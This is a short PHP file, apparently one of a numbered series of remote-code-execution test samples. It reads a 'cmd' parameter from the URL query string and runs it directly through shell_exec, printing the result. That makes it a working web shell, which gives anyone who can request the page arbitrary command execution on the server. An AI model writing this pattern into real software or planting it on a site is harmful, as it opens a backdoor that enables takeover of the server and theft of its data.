<?php
// RCE test variation #1176
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>